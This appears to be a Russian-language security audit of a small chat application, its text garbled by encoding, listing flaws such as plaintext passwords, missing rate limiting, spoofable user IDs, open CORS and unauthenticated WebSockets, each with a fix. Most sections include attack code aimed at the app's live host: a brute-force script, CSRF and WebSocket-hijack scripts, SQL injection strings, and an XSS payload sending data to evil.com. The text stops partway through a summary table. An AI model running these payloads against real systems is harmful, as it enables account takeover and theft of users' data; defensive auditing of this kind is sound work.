# üîì –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ - –î–µ—Ç–∞–ª—å–Ω—ã–π –∞–Ω–∞–ª–∏–∑

## ‚ö†Ô∏è –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π —É—Ä–æ–≤–µ–Ω—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏: 3/10

–≠—Ç–æ—Ç –¥–æ–∫—É–º–µ–Ω—Ç –æ–ø–∏—Å—ã–≤–∞–µ—Ç **—Ä–µ–∞–ª—å–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –≤–∑–ª–æ–º–∞** –≤–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π!

---

## üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï —É—è–∑–≤–∏–º–æ—Å—Ç–∏

### 1. –ü–∞—Ä–æ–ª–∏ —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ

**–ì–¥–µ:** `my_serve_chat_test/controllers/authController.js:16-17`

```javascript
const result = await pool.query(
  'INSERT INTO users (email, password) VALUES ($1, $2) RETURNING id, email',
  [email, password]  // ‚ö†Ô∏è –ü–∞—Ä–æ–ª—å —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –∫–∞–∫ –µ—Å—Ç—å!
);
```

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 1: –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
```sql
-- –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ë–î (—É—Ç–µ—á–∫–∞, SQL injection, –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è —Å–µ—Ä–≤–µ—Ä–∞)
SELECT id, email, password FROM users;

-- –†–µ–∑—É–ª—å—Ç–∞—Ç:
-- id | email           | password
-- 1  | user@mail.com   | mypassword123  ‚Üê –ü–∞—Ä–æ–ª—å –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ!
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–∏–¥–∏—Ç –í–°–ï –ø–∞—Ä–æ–ª–∏ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- ‚úÖ –ú–æ–∂–µ—Ç –≤–æ–π—Ç–∏ –ø–æ–¥ –ª—é–±—ã–º –∞–∫–∫–∞—É–Ω—Ç–æ–º
- ‚úÖ –ú–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–∏ –ø–∞—Ä–æ–ª–∏ –Ω–∞ –¥—Ä—É–≥–∏—Ö —Å–∞–π—Ç–∞—Ö (–µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–≤—Ç–æ—Ä—è–µ—Ç –ø–∞—Ä–æ–ª–∏)

#### –ê—Ç–∞–∫–∞ 2: –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π
```javascript
// authController.js:33
console.log('Login attempt:', { email, password });  // ‚ö†Ô∏è –ü–∞—Ä–æ–ª—å –≤ –ª–æ–≥–∞—Ö!
```

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**
1. –ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –ª–æ–≥–∞–º —Å–µ—Ä–≤–µ—Ä–∞ (—á–µ—Ä–µ–∑ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—é, —É—Ç–µ—á–∫—É, –∏–ª–∏ –µ—Å–ª–∏ –ª–æ–≥–∏ –ø—É–±–ª–∏—á–Ω—ã)
2. –ù–∞–π—Ç–∏ –≤—Å–µ –ø–∞—Ä–æ–ª–∏ –≤ –ª–æ–≥–∞—Ö
3. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏—Ö –¥–ª—è –≤—Ö–æ–¥–∞

**–ü—Ä–∏–º–µ—Ä –ª–æ–≥–æ–≤:**
```
Login attempt: { email: 'user@mail.com', password: 'secret123' }
Login attempt: { email: 'admin@mail.com', password: 'admin2024' }
```

---

### 2. –ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ (Brute Force)

**–ì–¥–µ:** `my_serve_chat_test/controllers/authController.js:31-54`

**–ü—Ä–æ–±–ª–µ–º–∞:** –ù–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –Ω–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 3: –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–¥–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π

```python
# –°–∫—Ä–∏–ø—Ç –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞
import requests

target_email = "victim@mail.com"
passwords = ["123456", "password", "qwerty", "admin", ...]  # –°–ø–∏—Å–æ–∫ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π

for password in passwords:
    response = requests.post(
        "https://my-server-chat.onrender.com/auth/login",
        json={"email": target_email, "password": password}
    )
    
    if response.status_code == 200:
        print(f"‚úÖ –ü–∞—Ä–æ–ª—å –Ω–∞–π–¥–µ–Ω: {password}")
        break
    else:
        print(f"‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å: {password}")
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
- ‚úÖ –ú–æ–∂–Ω–æ –ø–µ—Ä–µ–±—Ä–∞—Ç—å —Ç—ã—Å—è—á–∏ –ø–∞—Ä–æ–ª–µ–π –∑–∞ –º–∏–Ω—É—Ç—ã
- ‚úÖ –ù–µ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –ø–æ—Å–ª–µ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
- ‚úÖ –ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–Ω–µ—Ç –¥–ª—è —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–π –∞—Ç–∞–∫–∏

**–ó–∞—â–∏—Ç–∞:** Rate limiting, –∫–∞–ø—á–∞, –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ—Å–ª–µ N –ø–æ–ø—ã—Ç–æ–∫

---

### 3. –ù–µ—Ç —Ç–æ–∫–µ–Ω–æ–≤ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (JWT)

**–ì–¥–µ:** –í–µ–∑–¥–µ - –Ω–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤

**–ü—Ä–æ–±–ª–µ–º–∞:** –ü–æ—Å–ª–µ –≤—Ö–æ–¥–∞ –Ω–µ—Ç —Ç–æ–∫–µ–Ω–∞, —Ç–æ–ª—å–∫–æ userId –≤ SharedPreferences

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 4: –ü–æ–¥–º–µ–Ω–∞ userId

```dart
// –í –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ userId —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ SharedPreferences
// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å –µ–≥–æ –Ω–∞ –ª—é–±–æ–π –¥—Ä—É–≥–æ–π ID

// 1. –í–æ–π—Ç–∏ –ø–æ–¥ —Å–≤–æ–∏–º –∞–∫–∫–∞—É–Ω—Ç–æ–º (–ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π userId = 5)
// 2. –ò–∑–º–µ–Ω–∏—Ç—å SharedPreferences: userId = 1 (–∞–¥–º–∏–Ω –∏–ª–∏ –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)
// 3. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
// 4. –¢–µ–ø–µ—Ä—å –≤—Å–µ –∑–∞–ø—Ä–æ—Å—ã –∏–¥—É—Ç –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID = 1!
```

**–ü—Ä–∏–º–µ—Ä:**
```dart
// lib/services/storage_service.dart
await prefs.setString('user_id', '1');  // –ü–æ–¥–º–µ–Ω–∞ –Ω–∞ ID –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –ú–æ–∂–Ω–æ —á–∏—Ç–∞—Ç—å —á—É–∂–∏–µ —á–∞—Ç—ã
- ‚úÖ –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç —á—É–∂–æ–≥–æ –∏–º–µ–Ω–∏
- ‚úÖ –ú–æ–∂–Ω–æ —É–¥–∞–ª—è—Ç—å —á—É–∂–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
- ‚úÖ –ú–æ–∂–Ω–æ —É–¥–∞–ª—è—Ç—å —á—É–∂–∏–µ —á–∞—Ç—ã

**–ó–∞—â–∏—Ç–∞:** JWT —Ç–æ–∫–µ–Ω—ã —Å –ø–æ–¥–ø–∏—Å—å—é, –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ

---

### 4. CORS –æ—Ç–∫—Ä—ã—Ç –¥–ª—è –≤—Å–µ—Ö

**–ì–¥–µ:** `my_serve_chat_test/index.js:17`

```javascript
app.use(cors());  // ‚ö†Ô∏è –†–∞–∑—Ä–µ—à–∞–µ—Ç –∑–∞–ø—Ä–æ—Å—ã —Å –õ–Æ–ë–û–ì–û –¥–æ–º–µ–Ω–∞!
```

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 5: CSRF (Cross-Site Request Forgery)

```html
<!-- –ó–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã–π —Å–∞–π—Ç evil.com -->
<script>
  // –ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ö–æ–¥–∏—Ç –Ω–∞ evil.com, –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏:
  fetch('https://my-server-chat.onrender.com/auth/user/123', {
    method: 'DELETE',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: 'wrong'})
  });
  
  // –ò–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
  fetch('https://my-server-chat.onrender.com/messages', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      user_id: '123',
      chat_id: '1',
      content: '–°–ø–∞–º —Å–æ–æ–±—â–µ–Ω–∏–µ!'
    })
  });
</script>
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –ú–æ–∂–Ω–æ —É–¥–∞–ª—è—Ç—å –∞–∫–∫–∞—É–Ω—Ç—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- ‚úÖ –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç —á—É–∂–æ–≥–æ –∏–º–µ–Ω–∏
- ‚úÖ –ú–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –ª—é–±—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–ó–∞—â–∏—Ç–∞:** –û–≥—Ä–∞–Ω–∏—á–∏—Ç—å CORS, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å CSRF —Ç–æ–∫–µ–Ω—ã

---

### 5. WebSocket –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏

**–ì–¥–µ:** `my_serve_chat_test/websocket/websocket.js:14-18`

```javascript
wss.on('connection', (ws, req) => {
  const userId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('userId');
  if (!userId) return ws.close();
  
  clients.set(userId, ws);  // ‚ö†Ô∏è –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏, —á—Ç–æ userId –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç —ç—Ç–æ–º—É —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—é!
```

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 6: –ü–æ–¥–º–µ–Ω–∞ userId –≤ WebSocket

```javascript
// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è —Å –ª—é–±—ã–º userId
const ws = new WebSocket('wss://my-server-chat.onrender.com?userId=1');

// –¢–µ–ø–µ—Ä—å –æ–Ω –ø–æ–ª—É—á–∞–µ—Ç –≤—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID = 1
ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  console.log('–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:', message);
};

// –ò –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –∏–º–µ–Ω–∏ —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
ws.send(JSON.stringify({
  type: 'send',
  chat_id: '1',
  user_id: '1',  // –ü–æ–¥–º–µ–Ω–∞!
  content: '–í–∑–ª–æ–º–∞–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ!'
}));
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –ü–µ—Ä–µ—Ö–≤–∞—Ç –≤—Å–µ—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –ª—é–±–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- ‚úÖ –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç —á—É–∂–æ–≥–æ –∏–º–µ–Ω–∏
- ‚úÖ –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∞–∫–∫–∞—É–Ω—Ç–æ–º

**–ó–∞—â–∏—Ç–∞:** –ü—Ä–æ–≤–µ—Ä–∫–∞ JWT —Ç–æ–∫–µ–Ω–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ WebSocket

---

### 6. –ü–∞—Ä–æ–ª–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ

**–ì–¥–µ:** –í—Å–µ HTTP –∑–∞–ø—Ä–æ—Å—ã

**–ü—Ä–æ–±–ª–µ–º–∞:** –ü–∞—Ä–æ–ª–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –ø–æ HTTP/HTTPS, –Ω–æ –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 7: Man-in-the-Middle (MITM)

```javascript
// –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç —Ç—Ä–∞—Ñ–∏–∫ (–ø—É–±–ª–∏—á–Ω—ã–π WiFi, –ø—Ä–æ–∫—Å–∏)
// –û–Ω –≤–∏–¥–∏—Ç –≤—Å–µ –∑–∞–ø—Ä–æ—Å—ã:

POST /auth/login HTTP/1.1
Content-Type: application/json

{
  "email": "user@mail.com",
  "password": "secret123"  // ‚Üê –ü–∞—Ä–æ–ª—å –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ!
}
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –ü–µ—Ä–µ—Ö–≤–∞—Ç –ø–∞—Ä–æ–ª–µ–π –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å–µ—Ç–µ–π
- ‚úÖ –î–∞–∂–µ HTTPS –Ω–µ –∑–∞—â–∏—â–∞–µ—Ç, –µ—Å–ª–∏ –ø–∞—Ä–æ–ª—å —É–∂–µ –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ –≤ –∑–∞–ø—Ä–æ—Å–µ

**–ó–∞—â–∏—Ç–∞:** –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ (–Ω–æ –ª—É—á—à–µ - –ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ —Å —Ç–æ–∫–µ–Ω–∞–º–∏)

---

### 7. –ù–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö

**–ì–¥–µ:** –í—Å–µ –∫–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä—ã

**–ü—Ä–æ–±–ª–µ–º–∞:** –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è, –Ω–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ–æ—Ä–º–∞—Ç–∞ email, –¥–ª–∏–Ω—ã –ø–∞—Ä–æ–ª—è –∏ —Ç.–¥.

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 8: SQL Injection (—á–∞—Å—Ç–∏—á–Ω–æ –∑–∞—â–∏—â–µ–Ω–æ, –Ω–æ –µ—Å—Ç—å —Ä–∏—Å–∫–∏)

```javascript
// –•–æ—Ç—è –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã (—Ö–æ—Ä–æ—à–æ!)
// –ù–æ –µ—Å–ª–∏ –≥–¥–µ-—Ç–æ –µ—Å—Ç—å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –∑–∞–ø—Ä–æ—Å—ã:

const email = req.body.email;  // "admin@mail.com' OR '1'='1"
const password = req.body.password;  // "' OR '1'='1"

// –ï—Å–ª–∏ –±—ã –±—ã–ª —Ç–∞–∫–æ–π –∑–∞–ø—Ä–æ—Å (—Å–µ–π—á–∞—Å –Ω–µ—Ç, –Ω–æ –ø—Ä–∏–º–µ—Ä):
// `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`
// –†–µ–∑—É–ª—å—Ç–∞—Ç: SELECT * FROM users WHERE email = 'admin@mail.com' OR '1'='1' AND password = '' OR '1'='1'
// ‚Üí –í—Ö–æ–¥ –±–µ–∑ –ø–∞—Ä–æ–ª—è!
```

**–ó–∞—â–∏—Ç–∞:** –í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã (—É –≤–∞—Å —É–∂–µ –µ—Å—Ç—å ‚úÖ)

---

### 8. –ü—É–±–ª–∏—á–Ω—ã–π —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

**–ì–¥–µ:** `my_serve_chat_test/controllers/authController.js:58-68`

```javascript
export const getAllUsers = async (req, res) => {
  const result = await pool.query(
    'SELECT id, email FROM users ORDER BY email'
  );
  res.json(result.rows);  // ‚ö†Ô∏è –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –í–°–ï–• –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!
};
```

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

#### –ê—Ç–∞–∫–∞ 9: –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –¥–ª—è –∞—Ç–∞–∫–∏

```bash
# –ü—Ä–æ—Å—Ç–æ–π –∑–∞–ø—Ä–æ—Å:
curl https://my-server-chat.onrender.com/auth/users

# –†–µ–∑—É–ª—å—Ç–∞—Ç:
[
  {"id": 1, "email": "admin@mail.com"},
  {"id": 2, "email": "user1@mail.com"},
  {"id": 3, "email": "user2@mail.com"},
  ...
]

# –¢–µ–ø–µ—Ä—å –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∑–Ω–∞–µ—Ç:
# - –í—Å–µ email –∞–¥—Ä–µ—Å–∞
# - ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
# - –ú–æ–∂–µ—Ç –Ω–∞—á–∞—Ç—å —Ç–∞—Ä–≥–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω—É—é –∞—Ç–∞–∫—É
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –£—Ç–µ—á–∫–∞ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö (email)
- ‚úÖ –ú–æ–∂–Ω–æ –Ω–∞—á–∞—Ç—å —Ñ–∏—à–∏–Ω–≥ –∞—Ç–∞–∫—É
- ‚úÖ –ú–æ–∂–Ω–æ –ø–æ–¥–æ–±—Ä–∞—Ç—å –ø–∞—Ä–æ–ª–∏ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

**–ó–∞—â–∏—Ç–∞:** –û–≥—Ä–∞–Ω–∏—á–∏—Ç—å –¥–æ—Å—Ç—É–ø, —Ç—Ä–µ–±–æ–≤–∞—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é

---

## üü° –°–†–ï–î–ù–ò–ï —É—è–∑–≤–∏–º–æ—Å—Ç–∏

### 9. –ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç XSS (Cross-Site Scripting)

**–ü—Ä–æ–±–ª–µ–º–∞:** –°–æ–æ–±—â–µ–Ω–∏—è –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä—É—é—Ç—Å—è –ø–µ—Ä–µ–¥ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ–º

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

```javascript
// –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —Å JavaScript:
{
  "content": "<script>alert('XSS!'); localStorage.clear();</script>"
}

// –ò–ª–∏:
{
  "content": "<img src='x' onerror='fetch(\"https://evil.com/steal?data=\" + localStorage.getItem(\"user_id\"))'>"
}
```

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- ‚úÖ –ö—Ä–∞–∂–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ localStorage
- ‚úÖ –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ JavaScript
- ‚úÖ –ö—Ä–∞–∂–∞ —Å–µ—Å—Å–∏–π

---

### 10. –ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

**–ü—Ä–æ–±–ª–µ–º–∞:** –†–∞–∑–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –¥–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö/–Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

**–ö–∞–∫ –≤–∑–ª–æ–º–∞—Ç—å:**

```bash
# –ü–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞ —Å –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏–º email:
POST /auth/login
{"email": "nonexistent@mail.com", "password": "any"}

# –û—Ç–≤–µ—Ç: "–ù–µ–≤–µ—Ä–Ω—ã–π email –∏–ª–∏ –ø–∞—Ä–æ–ª—å"

# –ü–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞ —Å —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–º email:
POST /auth/login  
{"email": "user@mail.com", "password": "wrong"}

# –û—Ç–≤–µ—Ç: "–ù–µ–≤–µ—Ä–Ω—ã–π email –∏–ª–∏ –ø–∞—Ä–æ–ª—å" (—Ç–æ—Ç –∂–µ!)

# –ù–æ –≤—Ä–µ–º—è –æ—Ç–≤–µ—Ç–∞ –º–æ–∂–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è, –∏–ª–∏ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á–µ—Ä–µ–∑ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é:
POST /auth/register
{"email": "user@mail.com", "password": "any"}

# –û—Ç–≤–µ—Ç: "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç" ‚Üê –£—Ç–µ—á–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏!
```

---

## üìä –ú–∞—Ç—Ä–∏—Ü–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π

| –£—è–∑–≤–∏–º–æ—Å—Ç—å | –ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å | –°–ª–æ–∂–Ω–æ—Å—Ç—å —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ | –í–ª–∏—è–Ω–∏–µ |
|------------|-------------|------------------------|---------|
| –ü–∞—Ä–æ–ª–∏ –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ | üî¥ –ö—Ä–∏—Ç–∏—á–Ω–æ | ‚≠ê –õ–µ–≥–∫–æ | –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø |
| –ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ | üî¥ –ö—Ä–∏—Ç–∏—á–Ω–æ | ‚≠ê –õ–µ–≥–∫–æ | –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø |
| –ù–µ—Ç JWT —Ç–æ–∫–µ–Ω–æ–≤ | üî¥ –ö—Ä–∏—Ç–∏—á–Ω–æ | ‚≠ê‚≠ê –°—Ä–µ–¥–Ω–µ | –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø |
